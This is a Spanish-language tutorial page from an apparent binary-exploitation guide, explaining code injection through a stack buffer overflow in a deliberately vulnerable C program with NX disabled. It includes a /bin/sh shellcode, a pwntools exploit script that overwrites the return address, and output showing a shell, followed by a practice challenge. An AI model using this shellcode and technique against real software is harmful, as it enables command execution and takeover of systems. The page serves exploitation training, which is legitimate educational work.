---
layout: default
title: Code Injection
grand_parent: Tipos de explotación
parent: Explotación orientada a control
nav_order: 1
---

# Code Injection
{: .no_toc }

## Conocimientos necesarios
{: .no_toc .text-delta }

Antes de comenzar con esta sección, es recomendable que leas las siguientes
secciones de la guía si aún no las has leído:

[Stack](../../conceptos/stack.html){: .btn .btn-green }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Información General

La inyección de código consiste en que un atacante envía un input
cuidadosamente preparado a un programa para lograr que el programa
interprete ese input como código.

---

## Ejemplo

Empecemos viendo un programa simple en lenguaje C:

```c
int main() {
  int a, b;

  a = 5;
  b = 10;
}
```

Veamos el ensamblador generado:

```nasm
push   rbp
mov    rbp,rsp
mov    DWORD PTR [rbp-0x8],0x5
mov    DWORD PTR [rbp-0x4],0xa
mov    eax,0x0
pop    rbp
ret
```

Al igual que las variables que almacenamos en el stack o en el heap,
nuestro código también se guarda en memoria. Sin embargo, lo que
se guarda en memoria no son las instrucciones en el formato que vemos
arriba, sino que lo que se guarda son bytes que representan las
instrucciones de nuestro código.

Hay varias formas de ver los bytes generados para nuestro código. Una
forma que podemos usar es pegar nuestro código ensamblador en un
assembler como [https://defuse.ca/online-x86-assembler.htm](https://defuse.ca/online-x86-assembler.htm)

Veamos nuestro ensamblador junto con su equivalente en bytes:

```
0:  55                      push   rbp
1:  48 89 e5                mov    rbp,rsp
4:  c7 45 f8 05 00 00 00    mov    DWORD PTR [rbp-0x8],0x5
b:  c7 45 fc 0a 00 00 00    mov    DWORD PTR [rbp-0x4],0xa
12: b8 00 00 00 00          mov    eax,0x0
17: 5d                      pop    rbp
18: c3                      ret
```

Esto significa que si nosotros enviamos un input como: 
`"\x55\x48\x89\xE5\xC7\x45\xF8\x05\x00\x00\x00\xC7\x45\xFC\x0A\x00\x00\x00\xB8\x00\x00\x00\x00\x5D\xC3"`,
estaríamos guardando el código que vemos arriba en el stack.

Esto por si solo no es un problema, ya que todo depende de cómo interprete
el programa esos bytes. Por ejemplo, si tenemos los bytes `\x41\x41\x41\x41`,
el programa podría interpretarlos como un entero, y el resultado
sería 1094795585. En cambio, si interpreta esos bytes como un string, el
resultado sería "AAAA".

Teniendo esto en mente, el código que logramos meter al stack no sirve
por sí solo, necesitamos hacer que el programa lo interprete como instrucciones
y las ejecute.

Para esto requerimos 2 cosas:

1. Que la región de memoria en donde está guardado nuestro código tenga
permisos de ejecución.

2. Debemos hacer que el registro eip apunte a nuestro código para que
empiece a ejecutarlo.

Para este ejemplo, deshabilitaremos la protección NX para que el stack
tenga permisos de ejecución. Para lograr que eip apunte a nuestro código,
utilizaremos un buffer overflow.

Veamos el siguiente código:

```c
#include <stdio.h>

void vuln() {
  char input[32];

  printf("Tu input sera guardado en esta direccion: %p\n", input);

  puts("Ingresa tu input");
  gets(input);
}

int main() {
  vuln();
}
```

Para lograr que eip apunte a nuestro código, debemos cambiar el return
address en el stack para que al terminar la función main se ejecute
nuestro código.

Veamos el ensamblador resultante de nuestra función vuln para empezar
a bosquejar nuestro stack:

```nasm
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x24
call   0x80490b0 <__x86.get_pc_thunk.bx>
add    ebx,0x2e72
sub    esp,0x8
lea    eax,[ebp-0x28]
push   eax
lea    eax,[ebx-0x1fec]
push   eax
call   0x8049040 <printf@plt>
add    esp,0x10
sub    esp,0xc
lea    eax,[ebx-0x1fbe]
push   eax
call   0x8049060 <puts@plt>
add    esp,0x10
sub    esp,0xc
lea    eax,[ebp-0x28]
push   eax
call   0x8049050 <gets@plt>
add    esp,0x10
nop
mov    ebx,DWORD PTR [ebp-0x4]
leave
ret
```

Lo que nos interesa es encontrar el offset de nuestro input con respecto
a ebp. Observamos que el código le pasa ebp-0x28 como argumento a la
función gets, lo que significa que ese es nuestro input.

| Direcciones relativas  | Nombres        | Stack       | Registros   |
|:-----------------------|:---------------|:------------|:------------|
| ebp-0x28               | input          | ?           |             |
| ebp-0x24               | input          | ?           |             |
| ebp-0x20               | input          | ?           |             |
| ebp-0x1c               | input          | ?           |             |
| ebp-0x18               | input          | ?           |             |
| ebp-0x14               | input          | ?           |             |
| ebp-0x10               | input          | ?           |             |
| ebp-0xc                | input          | ?           |             |
| ebp-0x8                | ?              | ?           |             |
| ebp-0x4                | ?              | ?           |             |
| ebp                    | ebp guardado   | ?           | <- ebp      |
| ebp+0x4                | return address | ?           |             |

El plan es cambiar el return address por la dirección de nuestro input. Antes
de seguir con la explotación, debemos elegir el código que queremos ejecutar.
Antes obtuvimos los bytes de nuestra función main, pero ese código solo
creaba dos variables y les asignaba un valor. Lo que normalmente se busca
es conseguir ejecución de comandos. Podemos escribir manualmente el código
para conseguir la ejecución de comandos, pero también podemos encontrar
en internet los bytes de códigos que ya están hechos. Estos códigos son
conocidos como shellcodes.

Para este caso, buscaremos un shellcode para ejecutar /bin/sh. En este caso,
el binario fue compilado en linux 32 bits, por lo que buscaremos un shellcode
con esas características. En [https://www.exploit-db.com/exploits/42428](https://www.exploit-db.com/exploits/42428)
podemos encontrar un shellcode con las características que necesitamos.

Ahora que seleccionamos un shellcode, nuestro input para lograr obtener
ejecución de comandos debe tener el siguiente formato:

1. Shellcode
1. Padding
1. Dirección de nuestro shellcode

Con el stack que visualizamos anteriormente, sabemos que la distancia
entre nuestro input es de 0x28+0x4 (44). Con esto en mente, nuestro
input tendrá los siguientes tamaños:

1. Shellcode - 24 bytes (Es el tamaño del shellcode)
1. Padding - 20 bytes (Para completar los 44 bytes y alcanzar el return address)
1. Dirección de nuestro shellcode - 4 bytes (El tamaño de un pointer)

El stack resultante sería:

| Direcciones relativas  | Nombres                 | Stack       | Registros   |
|:-----------------------|:------------------------|:------------|:------------|
| ebp-0x28               | input (shellcode)       | 0x5099c031  |             |
| ebp-0x24               | input (shellcode)       | 0x732f2f68  |             |
| ebp-0x20               | input (shellcode)       | 0x622f6868  |             |
| ebp-0x1c               | input (shellcode)       | 0xe3896e69  |             |
| ebp-0x18               | input (shellcode)       | 0xe1895350  |             |
| ebp-0x14               | input (shellcode)       | 0x80cd0bb0  |             |
| ebp-0x10               | input (padding)         | 0x90909090  |             |
| ebp-0xc                | input (padding)         | 0x90909090  |             |
| ebp-0x8                | ? (padding)             | 0x90909090  |             |
| ebp-0x4                | ? (padding)             | 0x90909090  |             |
| ebp                    | ebp guardado (padding)  | 0x90909090  | <- ebp      |
| ebp+0x4                | return address (&input) | ?           |             |

Hagamos un script con python y pwntools para preparar nuestro input y
enviarlo al programa:

```py
from pwn import *

vuln = ELF("./code_injection")
context.log_level = 'critical'

p = process(vuln.path)

# Primero leemos la dirección en donde se guarda nuestro input

p.recvuntil(b"Tu input sera guardado en esta direccion: ")

address = int(p.recvline(), 16)

shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload =  shellcode        # Shellcode
payload += b"\x90" * 20     # Padding
payload += p32(address)     # Dirección de nuestro input

p.sendline(payload)
p.interactive();
```

Veamos lo que sucede al ejecutar nuestro script:

```
$ python3 solve.py
[*] '/tmp/code_injection'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
Ingresa tu input
$ echo "Ejecucion de codigo"
Ejecucion de codigo
```

De esta forma logramos hacer que el programa ejecute el código que nosotros
ingresamos por input.

## Retos

---

### inj1

¡Crea tu propio shellcode para llamar a la función win con los argumentos
necesarios!

Archivos:

[inj1](../../retos/inj/inj1.zip){: .btn .btn-blue }
